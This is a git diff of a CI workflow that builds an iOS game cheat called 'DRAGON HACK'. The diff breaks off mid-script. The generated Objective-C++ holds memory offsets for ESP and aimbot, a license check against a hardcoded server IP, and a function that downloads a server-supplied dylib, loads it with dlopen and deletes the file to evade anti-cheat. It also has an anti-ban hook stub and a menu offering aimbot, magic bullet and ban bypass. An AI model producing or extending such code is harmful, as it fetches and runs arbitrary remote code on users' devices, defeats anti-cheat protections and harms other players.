@@ -1,4 +1,4 @@
-name: 🐲 DRAGON HACK - CHEETO EDITION (iOS)
+name: 🐲 DRAGON HACK - CHEETO VIP (iOS)
 
 on:
   push:
@@ -18,7 +18,7 @@ jobs:
         uses: actions/checkout@v4
 
       # ========================================================
-      # 1. التوليد البرمجي (Objective-C++ & C++ & WebKit)
+      # 1. التوليد البرمجي (Objective-C++ & WebKit)
       # ========================================================
       - name: 📝 توليد محرك دراكون (wsam.mm)
         run: |
@@ -29,73 +29,107 @@ jobs:
           #import <WebKit/WebKit.h>
           #include <iostream>
           #include <string>
-          #include <thread>
-          #include <vector>
-          #include <dlfcn.h>
-          #include <unistd.h>
-          #include "json.hpp" // مكتبة معالجة بيانات السيرفر
+          #include <dlfcn.h>      // [شرح]: للتعامل مع الذاكرة وفتح الملفات (dlopen)
+          #include <unistd.h>     // [شرح]: لاستخدام أمر الحذف (unlink)
+          #include "json.hpp"     // [شرح]: مكتبة JSON لقراءة أوامر لوحة التحكم
 
           using json = nlohmann::json;
           using namespace std;
 
           // ==========================================================
           // 1. [إحداثيات الرادار والمميزات - Offsets] 🎯
+          // [شرح]: هنا تضع إحداثيات اللعبة لاستخراج أماكن اللاعبين
           // ==========================================================
           uintptr_t GWORLD_ADDR = 0x11223344; 
           uintptr_t GNAMES_ADDR = 0x55667788; 
           
-          uintptr_t OFF_ACTOR_ARRAY = 0xA0;    // مصفوفة اللاعبين
-          uintptr_t OFF_HEALTH      = 0x988;   // الصحة
-          uintptr_t OFF_NAME        = 0x640;   // الاسم
-          uintptr_t OFF_BONE        = 0x5B0;   // الهيكل العظمي
+          uintptr_t OFF_ACTOR_ARRAY = 0xA0;    // [شرح]: مصفوفة اللاعبين
+          uintptr_t OFF_HEALTH      = 0x988;   // [شرح]: دم اللاعب
+          uintptr_t OFF_NAME        = 0x640;   // [شرح]: اسم اللاعب
+          uintptr_t OFF_BONE        = 0x5B0;   // [شرح]: عظام اللاعب
           
-          uintptr_t OFF_NO_RECOIL   = 0x1A2B3C; // ثبات السلاح
-          uintptr_t OFF_AIMBOT      = 0x4D5E6F; // الإيمبوت
+          uintptr_t OFF_NO_RECOIL   = 0x1A2B3C; // [شرح]: ثبات السلاح
+          uintptr_t OFF_AIMBOT      = 0x4D5E6F; // [شرح]: الإيمبوت
 
           // ==========================================================
-          // 2. [إعدادات السيرفر وحقن الشادو] 🌐
+          // 2. [إعدادات السيرفر] 🌐
+          // [شرح]: رابط لوحتك للتحقق من الكود وجلب أوامر الشادو
           // ==========================================================
           const string SERVER_URL = "http://34.204.178.160/panel.php?api=check";
           bool g_IsLoggedIn = false;
-          bool g_IsServerFrozen = false; 
+          bool g_IsServerFrozen = false; // [شرح]: تحويلها لـ true يجمد النظام بشاشة سوداء
 
-          // [شرح]: دالة سحب وحقن وحذف دايلب الشادو من السيرفر أونلاين
-          void DownloadAndInjectShadow(string url) {
-              if (url.empty()) return;
+          // ==========================================================
+          // 3. [محرك الشادو أونلاين - Online Shadow Injector] 👻
+          // [شرح]: تسحب الدايلب من السيرفر، تزرعه بالذاكرة، وتمسحه فوراً!
+          // ==========================================================
+          void DownloadAndInjectShadow(string dylib_url) {
+              if (dylib_url.empty()) return;
               @autoreleasepool {
-                  NSURL *dylibURL = [NSURL URLWithString:[NSString stringWithUTF8String:url.c_str()]];
-                  NSData *data = [NSData dataWithContentsOfURL:dylibURL];
+                  NSLog(@"[W-MASTER] جاري تحميل ملف الحماية الخفي...");
+                  NSURL *url = [NSURL URLWithString:[NSString stringWithUTF8String:dylib_url.c_str()]];
+                  NSData *data = [NSData dataWithContentsOfURL:url];
+                  
                   if (data) {
+                      // [شرح]: حفظ الملف بمسار التخزين المؤقت
                       NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"shadow.dylib"];
                       [data writeToFile:path atomically:YES];
-                      void* handle = dlopen([path UTF8String], RTLD_NOW); // حقن بالذاكرة
-                      if (handle) unlink([path UTF8String]); // حذف فيزيائي فوراً!
+                      
+                      // [شرح]: حقن الملف بالذاكرة
+                      void* handle = dlopen([path UTF8String], RTLD_NOW);
+                      if (handle) {
+                          NSLog(@"[W-MASTER] ✅ تم حقن الشادو بنجاح!");
+                          // [شرح]: أمر unlink يمسح الملف نهائياً من الجهاز لتجنب الانتي شيت
+                          unlink([path UTF8String]); 
+                      }
                   }
               }
           }
 
-          // [شرح]: الاتصال بلوحة PHP وجلب حالة الحماية والأوفستات
+          // ==========================================================
+          // 4. [هوك الحماية - Anti-Ban Hooks] 🛡️
+          // [شرح]: المكان المخصص لزرع هوكات حظر الروابط أو تخطي الفحص
+          // ==========================================================
+          void InstallAntiBanHooks() {
+              // [شرح]: مثال: DobbyHook((void*)ptr, (void*)my_func, (void**)&orig);
+              NSLog(@"[W-MASTER] 🛡️ تم تفعيل هوكات الحماية والباند 10 دقائق.");
+          }
+
+          // ==========================================================
+          // 5. [دالة الاتصال بالسيرفر والتحقق] 📡
+          // ==========================================================
           string SyncWithServer(string key) {
-              string result = "{\"status\":\"error\"}";
+              string result = "{\"status\":\"error\", \"msg\":\"فشل الاتصال\"}";
               @autoreleasepool {
                   NSString *hwid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
                   NSString *urlStr = [NSString stringWithFormat:@"%s&key=%s&hwid=%@", SERVER_URL.c_str(), key.c_str(), hwid];
+                  
                   NSData *data = [NSData dataWithContentsOfURL:[NSURL URLWithString:urlStr]];
                   if(data) {
                       result = string((char*)[data bytes], [data length]);
-                      auto res = json::parse(result);
-                      if(res["server_state"] == "danger") g_IsServerFrozen = true;
-                      if(res["status"] == "success") {
-                          g_IsLoggedIn = true;
-                          if (res.contains("shadow_lib")) DownloadAndInjectShadow(res["shadow_lib"].get<string>());
-                      }
+                      try {
+                          auto res = json::parse(result);
+                          if(res["server_state"] == "danger") {
+                              g_IsServerFrozen = true; // [شرح]: تفعيل الشاشة السوداء
+                          } else if(res["status"] == "success") {
+                              g_IsLoggedIn = true;
+                              
+                              // [شرح]: إذا السيرفر أرسل ملف شادو، يتم حقنه
+                              if (res.contains("shadow_lib")) {
+                                  DownloadAndInjectShadow(res["shadow_lib"].get<string>());
+                              }
+                              // [شرح]: تفعيل الحمايات
+                              InstallAntiBanHooks();
+                          }
+                      } catch (...) {}
                   }
               }
               return result;
           }
 
           // ==========================================================
-          // 3. [واجهة الويب الملكية - رسومات الشيتو] 🎨
+          // 6. [واجهة الويب الملكية - HTML/CSS/JS] 🎨
+          // [شرح]: تصميم الشيتو، بدون شريط علوي، منيو ثابت لا يتحرك، لمبات ذكية
           // ==========================================================
           const char* HTML_UI = R"HTML(
           <!DOCTYPE html>
@@ -103,195 +137,280 @@ jobs:
           <head>
               <meta charset="UTF-8">
               <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+              <title>DRAGON CHEETO UI</title>
               <style>
-                  :root { --cyan: #00e5ff; --bg: #0b0f13; --panel: #161c24; --green: #00ff66; --red: #ff3366; }
-                  body { margin: 0; padding: 0; font-family: sans-serif; background: transparent; height: 100vh; overflow: hidden; color: #fff; pointer-events: none; }
+                  :root { --cyan: #00e5ff; --bg: #05080a; --panel: #161c24; --green: #00ff66; --red: #ff3366; }
+                  body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; background: transparent; height: 100vh; overflow: hidden; color: #fff; pointer-events: none; }
                   .interactive { pointer-events: auto; }
 
-                  /* ================= رادار الشيتو (Cheeto Style) ================= */
-                  #esp-radar { position: fixed; inset: 0; z-index: 50; display: none; }
-                  .radar-origin { position: absolute; top: 10px; left: 50%; width: 12px; height: 12px; background: var(--red); border-radius: 50%; transform: translateX(-50%); box-shadow: 0 0 15px var(--red); }
-                  .radar-count { position: absolute; top: 25px; left: 50%; transform: translateX(-50%); color: var(--green); font-size: 14px; font-weight: 900; text-shadow: 1px 1px 2px #000; letter-spacing: 1px; }
+                  /* ================= 1. رادار الشيتو (Cheeto ESP) ================= */
+                  #cheeto-radar { position: fixed; inset: 0; z-index: 50; display: none; pointer-events: none; }
                   
-                  /* محاكاة اللاعب والأخطوط والأسهم */
-                  .player-box { position: absolute; top: 40%; left: 30%; width: 65px; height: 140px; border: 1px solid var(--green); display: none; }
-                  .player-line { position: absolute; top: 10px; left: 50%; width: 2px; height: 40%; background: linear-gradient(to bottom, var(--red), var(--green)); transform-origin: top; transform: rotate(30deg); opacity: 0.6; }
-                  .cheeto-arrow { position: absolute; top: 30%; left: 28%; color: var(--green); font-size: 24px; animation: float 1s infinite alternate; }
-                  @keyframes float { from { transform: translateY(0); } to { transform: translateY(-10px); } }
+                  /* نقطة الصفر (0) في الأعلى */
+                  .radar-top-dot { position: absolute; top: 15px; left: 50%; width: 14px; height: 14px; background: var(--red); border-radius: 50%; transform: translateX(-50%); box-shadow: 0 0 15px var(--red); border: 2px solid #fff; }
+                  
+                  /* كلمة الأعداء والعدد فوق النقطة */
+                  .radar-enemy-count { position: absolute; top: 35px; left: 50%; transform: translateX(-50%); color: var(--green); font-size: 16px; font-weight: 900; text-shadow: 1px 1px 2px #000, -1px -1px 2px #000; letter-spacing: 1px; }
+                  
+                  /* اللاعب الوهمي للمحاكاة */
+                  .player-box { position: absolute; top: 45%; left: 35%; width: 70px; height: 150px; border: 2px solid var(--green); display: flex; flex-direction: column; align-items: center; }
+                  .player-name { position: absolute; top: -22px; color: #fff; font-size: 11px; font-weight: bold; text-shadow: 1px 1px 0 #000; white-space: nowrap; }
+                  .player-hp { position: absolute; left: -8px; bottom: 0; width: 4px; height: 85%; background: var(--green); border: 1px solid #000; }
+                  
+                  /* خط اللاين من النقطة للعدو */
+                  .snapline { position: absolute; top: 25px; left: 50%; width: 2px; height: 42%; background: linear-gradient(to bottom, rgba(255,51,102,0.8), var(--green)); transform-origin: top; transform: rotate(20deg); box-shadow: 0 0 5px var(--green); }
+                  
+                  /* سهم الشيتو الأخضر */
+                  .cheeto-arrow { position: absolute; top: -35px; color: var(--green); font-size: 20px; animation: bounce 1s infinite alternate; text-shadow: 0 2px 5px #000; }
+                  @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-8px); } }
 
-                  /* ================= شاشة التجميد (الصيانة) ================= */
+                  /* ================= 2. شاشة التجميد (صيانة) ================= */
                   #freeze-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
+                  .freeze-box { border: 2px dashed var(--red); padding: 40px; border-radius: 15px; text-align: center; background: rgba(255,51,102,0.05); }
 
-                  /* ================= اللوكن الملكي (Centered) ================= */
-                  #login-screen { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index: 5000; display: flex; align-items: center; justify-content: center; }
-                  .login-card { background: var(--panel); padding: 35px; border-radius: 20px; border: 1px solid #30363d; width: 330px; text-align: center; border-top: 4px solid var(--cyan); box-shadow: 0 30px 100px #000; }
-                  .key-in { width: 100%; padding: 15px; background: #010409; border: 1px solid #333; color: var(--cyan); text-align: center; border-radius: 10px; margin-bottom: 20px; font-family: monospace; font-size: 18px; outline: none; }
-                  .btn-act { width: 100%; padding: 15px; background: var(--cyan); color: #000; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 16px; }
+                  /* ================= 3. اللوكن (تجميد اللعبة وعدم الحفظ) ================= */
+                  #login-screen { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(12px); z-index: 5000; display: flex; align-items: center; justify-content: center; }
+                  .login-card { background: var(--panel); padding: 35px; border-radius: 20px; border: 1px solid #30363d; width: 320px; text-align: center; border-top: 4px solid var(--cyan); box-shadow: 0 30px 100px #000; }
+                  .logo-text { font-size: 26px; font-weight: 900; color: var(--cyan); letter-spacing: 2px; margin-bottom: 25px; text-shadow: 0 0 15px rgba(0,229,255,0.4); }
+                  
+                  .key-in { width: 100%; padding: 16px; background: #000; border: 1px solid #333; border-radius: 10px; color: var(--cyan); font-family: monospace; font-size: 18px; text-align: center; box-sizing: border-box; margin-bottom: 20px; text-transform: uppercase; outline: none; }
+                  .key-in:focus { border-color: var(--cyan); box-shadow: 0 0 10px rgba(0,229,255,0.2); }
+                  .btn-act { width: 100%; padding: 16px; background: var(--cyan); color: #000; border: none; border-radius: 10px; font-weight: 900; font-size: 16px; cursor: pointer; transition: 0.3s; }
+                  .btn-act:active { transform: scale(0.95); }
 
-                  /* ================= المنيو الإمبراطوري ================= */
-                  #main-menu { position: absolute; top: 60px; left: 20px; width: 350px; background: rgba(13, 17, 23, 0.98); border: 1px solid #30363d; border-radius: 15px; z-index: 1500; display: none; flex-direction: column; box-shadow: 0 20px 80px rgba(0,0,0,0.9); border-top: 3px solid var(--cyan); }
-                  .m-head { padding: 15px; background: linear-gradient(90deg, #161b22, #0d1117); border-bottom: 1px solid #30363d; font-weight: 900; display: flex; justify-content: space-between; font-size: 14px; color: var(--cyan); cursor: move; }
-                  .m-content { padding: 20px; max-height: 500px; overflow-y: auto; }
+                  /* ================= 4. المنيو الرئيسي (ثابت لا يتحرك) ================= */
+                  /* [شرح]: تم تثبيت المنيو في منتصف يسار الشاشة لسهولة الوصول */
+                  #main-menu { position: fixed; top: 50%; left: 20px; transform: translateY(-50%); width: 340px; background: rgba(13, 17, 23, 0.96); border: 1px solid #30363d; border-radius: 15px; z-index: 1500; display: none; flex-direction: column; box-shadow: 0 20px 80px #000; border-top: 3px solid var(--cyan); backdrop-filter: blur(10px); }
+                  .m-head { padding: 15px; background: linear-gradient(90deg, #161b22, #0d1117); border-bottom: 1px solid #30363d; font-weight: 900; display: flex; justify-content: space-between; font-size: 15px; color: var(--cyan); }
+                  .m-content { padding: 18px; max-height: 70vh; overflow-y: auto; }
 
-                  /* بطاقة الاشتراك VIP */
-                  .vip-card { border: 1px solid rgba(0,229,255,0.3); background: rgba(0,229,255,0.03); padding: 15px; border-radius: 12px; margin-bottom: 20px; border-right: 4px solid var(--cyan); position: relative; }
-                  .led-box { display: flex; gap: 10px; margin-top: 10px; }
-                  .led-item { display: flex; align-items: center; gap: 5px; font-size: 10px; font-weight: bold; background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 10px; }
-                  .dot { width: 8px; height: 8px; border-radius: 50%; box-shadow: 0 0 8px currentColor; }
-                  .blink { animation: pulse 1.5s infinite; }
-                  @keyframes pulse { 50% { opacity: 0.2; } }
+                  /* بطاقة VIP واللمبات المدمجة */
+                  .vip-card { border: 1px solid rgba(0,229,255,0.3); background: rgba(0,229,255,0.03); padding: 15px; border-radius: 10px; margin-bottom: 20px; border-right: 4px solid var(--cyan); }
+                  
+                  .led-panel { display: flex; gap: 15px; margin-top: 12px; padding-top: 12px; border-top: 1px dashed rgba(255,255,255,0.1); }
+                  .led-item { display: flex; align-items: center; gap: 6px; font-size: 12px; font-weight: bold; background: rgba(0,0,0,0.5); padding: 5px 10px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1); }
+                  .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+                  .dot-live { background: var(--green); box-shadow: 0 0 10px var(--green); animation: pulse 1.5s infinite; }
+                  .dot-safe { background: var(--green); box-shadow: 0 0 10px var(--green); }
+                  .dot-danger { background: var(--red); box-shadow: 0 0 10px var(--red); }
+                  @keyframes pulse { 50% { opacity: 0.3; } }
 
-                  /* القوائم المنسدلة */
-                  .drop-btn { width: 100%; padding: 14px; background: #1c2128; border: 1px solid #30363d; color: #fff; text-align: right; border-radius: 8px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; font-weight: bold; }
+                  /* المنسدلات والسويتشات */
+                  .drop-btn { width: 100%; padding: 14px; background: #1c2128; border: 1px solid #30363d; color: #fff; text-align: right; border-radius: 8px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; font-weight: bold; transition: 0.2s; }
+                  .drop-btn:active { background: #24292e; border-color: var(--cyan); }
                   .drop-content { display: none; padding: 10px; border-right: 2px solid var(--cyan); background: rgba(255,255,255,0.01); margin-bottom: 12px; }
 
-                  /* السويتشات */
                   .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.03); align-items: center; font-size: 13px; }
-                  .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
+                  
+                  /* تصميم السويتش المتماسك (لن يتكسر) */
+                  .switch { position: relative; display: inline-block; width: 44px; height: 24px; flex-shrink: 0; }
                   .switch input { opacity: 0; width: 0; height: 0; }
-                  .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #30363d; transition: .3s; border-radius: 34px; }
-                  .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: #8b949e; transition: .3s; border-radius: 50%; }
-                  input:checked + .slider { background-color: var(--cyan); }
+                  .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #30363d; transition: .3s; border-radius: 34px; border: 1px solid #444; }
+                  .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 2px; bottom: 2px; background-color: #8b949e; transition: .3s; border-radius: 50%; }
+                  input:checked + .slider { background-color: var(--cyan); border-color: var(--cyan); box-shadow: 0 0 10px rgba(0,229,255,0.3); }
                   input:checked + .slider:before { transform: translateX(20px); background-color: #000; }
 
-                  .rights { text-align: center; font-size: 10px; color: #555; margin-top: 20px; border-top: 1px solid #222; padding-top: 10px; }
+                  .rights { text-align: center; font-size: 11px; color: #555; margin-top: 20px; border-top: 1px solid #222; padding-top: 10px; }
               </style>
           </head>
           <body>
 
-              <!-- تجميد النظام -->
-              <div id="freeze-screen">
-                  <h1 style="color:var(--red)">SYSTEM FROZEN</h1>
-                  <p id="freezeMsg">تحت الصيانة الفنية من قبل محمد الشمري...</p>
-              </div>
-
-              <!-- رادار الشيتو -->
-              <div id="esp-radar">
-                  <div class="radar-origin"></div>
-                  <div class="radar-count">الأعـداء: 1</div>
-                  <div class="player-line" id="line1"></div>
-                  <div class="cheeto-arrow" id="arrow1">🔽</div>
-                  <div class="player-box" id="box1">
-                      <div style="position:absolute; top:-20px; width:100%; text-align:center; font-size:10px;">BOT [120m]</div>
-                      <div style="position:absolute; left:-6px; bottom:0; width:3px; height:80%; background:var(--green);"></div>
+              <!-- شاشة التجميد -->
+              <div id="freeze-screen" class="interactive">
+                  <div class="freeze-box">
+                      <h1 style="color:var(--red); margin:0;">⚠️ النظام متوقف</h1>
+                      <p id="freezeMsg" style="color:#fff; font-size:16px;">السيرفر تحت الصيانة الفنية...</p>
                   </div>
               </div>
 
-              <!-- شاشة اللوكن -->
+              <!-- شاشة اللوكن (لا تحفظ الكود) -->
               <div id="login-screen" class="interactive">
                   <div class="login-card">
-                      <h2 style="color:var(--cyan); margin:0;">DRAGON HACK</h2>
-                      <p style="color:#8b949e; font-size:12px; margin-bottom:25px;">برمجة المهندس محمد الشمري</p>
-                      <input type="text" id="key" class="key-in" placeholder="أدخل مفتاح التفعيل">
-                      <button class="btn-act" onclick="doLogin()">تسجيل الدخول</button>
-                      <p id="err" style="color:var(--red); font-size:11px; margin-top:15px; display:none;">فشل الاتصال!</p>
+                      <div class="logo-text">DRAGON HACK</div>
+                      <input type="text" id="keyInp" class="key-input" placeholder="أدخل كود الاشتراك هنا">
+                      <button class="btn-act" id="actBtn" onclick="processLogin()">تسجيل الدخول للسيرفر</button>
+                      <p id="msgErr" style="font-size:12px; color:var(--red); margin-top:15px; display:none;">فشل الاتصال بالسيرفر!</p>
                   </div>
               </div>
 
-              <!-- المنيو الرئيسي -->
+              <!-- رادار الشيتو (اللاين والأسهم) -->
+              <div id="cheeto-radar">
+                  <div class="radar-top-dot"></div>
+                  <div class="radar-enemy-count">الأعـداء: 1</div>
+                  <div class="snapline" id="line1"></div>
+                  <div class="player-box" id="box1">
+                      <div class="cheeto-arrow" id="arrow1">▼</div>
+                      <div class="player-name">BOT [150m]</div>
+                      <div class="player-hp"></div>
+                  </div>
+              </div>
+
+              <!-- المنيو الرئيسي (ثابت) -->
               <div id="main-menu" class="interactive">
-                  <div class="m-header" id="dragH">دراكون الملكي | محمد الشمري <span onclick="toggleMenu()" style="cursor:pointer">✕</span></div>
+                  <div class="m-head">
+                      <span>🦅 حماية محمد الشمري</span>
+                      <span onclick="toggleMenu()" style="cursor:pointer; color:#8b949e;">✕</span>
+                  </div>
                   <div class="m-content">
+                      
+                      <!-- بطاقة الاشتراك واللمبات المدمجة -->
                       <div class="vip-card">
                           <div style="color:var(--cyan); font-weight:bold; font-size:14px;">المشترك: محمد الشمري (VIP)</div>
-                          <div style="font-size:12px; color:#8b949e; margin-top:5px;">الانتهاء: <span id="exp">14/04/2026</span></div>
-                          <div class="led-box">
-                              <div class="led-item" style="color:var(--green)"><div class="dot blink" style="background:currentColor"></div> متصل</div>
-                              <div class="led-item" id="protectLed" style="color:var(--green)"><div class="dot" style="background:currentColor"></div> آمن</div>
+                          <div style="font-size:12px; color:#8b949e; margin-top:5px;">الانتهاء: <span style="color:#fff;" id="expDate">--/--/----</span></div>
+                          
+                          <div class="led-panel">
+                              <div class="led-item" style="color:var(--green)"><div class="dot dot-live"></div> السيرفر: Live</div>
+                              <div class="led-item" id="protLed" style="color:var(--green)"><div class="dot dot-safe" id="safeDot"></div> الحماية: آمن</div>
                           </div>
                       </div>
 
-                      <div class="drop-btn" onclick="toggleDrop('c1')">🛡️ الحماية وتخطي الباند <span>▼</span></div>
+                      <!-- 1. القائمة الأولى -->
+                      <div class="drop-btn" onclick="toggleDrop('c1')">🛡️ تفعيل الحماية والباند 10 دقائق <span>▼</span></div>
                       <div class="drop-content" id="c1">
-                          <div class="row"><span>تفعيل الحماية (Bypass)</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
-                          <div class="row"><span>تخطي باند 10 دقايق</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
-                          <div class="row"><span>حقن حماية الشادو أونلاين</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
+                          <div class="row"><span>تفعيل الحماية الأساسية (Bypass)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('bypass', this.checked)" checked><span class="slider"></span></label></div>
+                          <div class="row"><span>تخطي باند 10 دقائق (Anti-10m)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('anti10', this.checked)" checked><span class="slider"></span></label></div>
+                          <div class="row"><span>حقن ملف الشادو أونلاين (Shadow)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('shadow', this.checked)" checked><span class="slider"></span></label></div>
                       </div>
 
-                      <div class="drop-btn" onclick="toggleDrop('c2')">👁️ رادار الشيتو (ESP) <span>▼</span></div>
-                      <div class="drop-content" id="c2">
-                          <div class="row"><span>تفعيل الرادار الرئيسي</span> <label class="switch"><input type="checkbox" onchange="toggleESP(this.checked)" checked><span class="slider"></span></label></div>
-                          <div class="row"><span>🏷️ الاسم والصحة</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
-                          <div class="row"><span>🔲 صندوق اللاعب</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
-                          <div class="row"><span>☠️ الهيكل العظمي</span> <label class="switch"><input type="checkbox"><span class="slider"></span></label></div>
-                          <div class="row"><span style="color:var(--red)">📍 خطوط اللاين (Snaplines)</span> <label class="switch"><input type="checkbox" onchange="toggleLines(this.checked)" checked><span class="slider"></span></label></div>
+                      <!-- 2. القائمة الثانية -->
+                      <div class="drop-btn" onclick="toggleDrop('c2')">👁️ خصائص الرادار (ESP) <span>▼</span></div>
+                      <div class="drop-content" id="c2" style="display:block">
+                          <div class="row"><span>تفعيل الرادار الشامل</span> <label class="switch"><input type="checkbox" onchange="toggleRadar(this.checked)" checked><span class="slider"></span></label></div>
+                          <div class="row" style="padding-right:15px;"><span>صندوق اللاعب (Box)</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
+                          <div class="row" style="padding-right:15px;"><span>الاسم والصحة (Name/HP)</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
+                          <div class="row" style="padding-right:15px;"><span>الهيكل العظمي (Skeleton)</span> <label class="switch"><input type="checkbox"><span class="slider"></span></label></div>
+                          <div class="row" style="border-top:1px dashed #333; margin-top:5px; padding-top:10px;">
+                              <span style="color:var(--red);">📍 خط اللاين العلوي (Snaplines)</span> 
+                              <label class="switch"><input type="checkbox" onchange="toggleLines(this.checked)" checked><span class="slider"></span></label>
+                          </div>
                       </div>
 
-                      <div class="drop-btn" onclick="toggleDrop('c3')">🎯 التفعيلات القتالية (Aim) <span>▼</span></div>
+                      <!-- 3. القائمة الثالثة -->
+                      <div class="drop-btn" onclick="toggleDrop('c3')">🎯 التفعيلات القتالية (Combat) <span>▼</span></div>
                       <div class="drop-content" id="c3">
-                          <div class="row"><span>🔫 ثبات السلاح 100%</span> <label class="switch"><input type="checkbox"><span class="slider"></span></label></div>
-                          <div class="row"><span>🎯 ايمبوت ذكي (Cheeto)</span> <label class="switch"><input type="checkbox"><span class="slider"></span></label></div>
+                          <div class="row"><span>ثبات السلاح 100% (Recoil)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('recoil', this.checked)"><span class="slider"></span></label></div>
+                          <div class="row"><span>ايمبوت ذكي (Aimbot)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('aim', this.checked)"><span class="slider"></span></label></div>
+                          <div class="row"><span>طلقة سحرية (Magic Bullet)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('magic', this.checked)"><span class="slider"></span></label></div>
+                          <div class="row"><span>علامة تصويب صغيرة (Crosshair)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('cross', this.checked)"><span class="slider"></span></label></div>
+                          <div class="row"><span>منظور الايباد (iPad View)</span> <label class="switch"><input type="checkbox" onchange="sendCmd('ipad', this.checked)"><span class="slider"></span></label></div>
                       </div>
 
-                      <div class="rights">جميع الحقوق محفوظة للمطور محمد الشمري © 2026</div>
+                      <div class="rights" onclick="alert('برمجة: محمد الشمري')">جميع الحقوق محفوظة للمطور محمد الشمري © 2026</div>
                   </div>
               </div>
 
               <script>
-                  // حفظ الكود تلقائياً
-                  window.onload = () => { if(localStorage.getItem('k')) document.getElementById('key').value = localStorage.getItem('k'); };
-                  
-                  function doLogin() {
-                      let k = document.getElementById('key').value;
-                      localStorage.setItem('k', k);
-                      window.webkit.messageHandlers.wmaster.postMessage(JSON.stringify({action:"login", key:k}));
+                  // [شرح]: دالة اللوكن، تأخذ الكود المدخل وترسله للـ C++ ولا تحفظه!
+                  function processLogin() {
+                      const btn = document.getElementById('actBtn');
+                      const key = document.getElementById('keyInp').value;
+                      if(key.length < 3) { alert("يرجى إدخال الكود!"); return; }
+                      
+                      btn.innerText = 'جاري التحقق...';
+                      window.webkit.messageHandlers.wmaster.postMessage(JSON.stringify({action:"login", key:key}));
                   }
 
+                  // [شرح]: استقبال الرد من السيرفر
                   function onLoginResponse(resStr) {
                       let res = JSON.parse(resStr);
                       if (res.status === 'success') {
                           document.getElementById('login-screen').style.display = 'none';
                           document.getElementById('main-menu').style.display = 'flex';
-                          document.getElementById('esp-radar').style.display = 'block';
+                          document.getElementById('expDate').innerText = res.expire;
+                          
+                          // إظهار رادار الشيتو للمعاينة
+                          toggleRadar(true);
+                          
+                          // تغيير لمبة الحماية إذا كان السيرفر بخطر
+                          if (res.server_state === 'danger') {
+                              const pLed = document.getElementById('protLed');
+                              const sDot = document.getElementById('safeDot');
+                              pLed.style.color = 'var(--red)';
+                              sDot.className = 'dot dot-danger';
+                              pLed.innerHTML = sDot.outerHTML + ' الحماية: خطر 🔴';
+                          }
                       } else if (res.status === 'freeze') {
                           document.getElementById('login-screen').style.display = 'none';
                           document.getElementById('freeze-screen').style.display = 'flex';
-                      } else { document.getElementById('err').style.display = 'block'; }
+                          document.getElementById('freezeMsg').innerText = res.msg;
+                      } else {
+                          document.getElementById('actBtn').innerText = 'تسجيل الدخول للسيرفر';
+                          document.getElementById('msgErr').style.display = 'block';
+                          document.getElementById('msgErr').innerText = res.msg;
+                      }
                   }
 
-                  function toggleESP(s) { document.getElementById('box1').style.display = s?'block':'none'; document.getElementById('arrow1').style.display = s?'block':'none'; }
-                  function toggleLines(s) { document.getElementById('line1').style.display = s?'block':'none'; }
+                  // إرسال أوامر السويتشات
+                  function sendCmd(feat, state) {
+                      window.webkit.messageHandlers.wmaster.postMessage(JSON.stringify({action:"toggle", feature:feat, state:state}));
+                  }
+
+                  // محاكاة رادار الشيتو
+                  function toggleRadar(state) {
+                      document.getElementById('cheeto-radar').style.display = state ? 'block' : 'none';
+                  }
+                  function toggleLines(state) {
+                      document.getElementById('line1').style.display = state ? 'block' : 'none';
+                      document.getElementById('arrow1').style.display = state ? 'block' : 'none';
+                  }
+
                   function toggleMenu() { let m = document.getElementById('main-menu'); m.style.display = m.style.display==='none'?'flex':'none'; }
                   function toggleDrop(id) { let d = document.getElementById(id); d.style.display = d.style.display==='block'?'none':'block'; }
-                  document.body.addEventListener('touchstart', e => { if(e.touches.length === 3) toggleMenu(); });
-
-                  // نظام السحب
-                  let win = document.getElementById("main-menu"), head = document.getElementById("dragH"), p1=0, p2=0, p3=0, p4=0;
-                  head.ontouchstart = (e) => { p3=e.touches[0].clientX; p4=e.touches[0].clientY; document.ontouchend = () => document.ontouchmove = null; document.ontouchmove = (ev) => { ev.preventDefault(); p1=p3-ev.touches[0].clientX; p2=p4-ev.touches[0].clientY; p3=ev.touches[0].clientX; p4=ev.touches[0].clientY; win.style.top=(win.offsetTop-p2)+"px"; win.style.left=(win.offsetLeft-p1)+"px"; }; };
+                  
+                  // الإخفاء بـ 3 أصابع 
+                  document.addEventListener('touchstart', e => { 
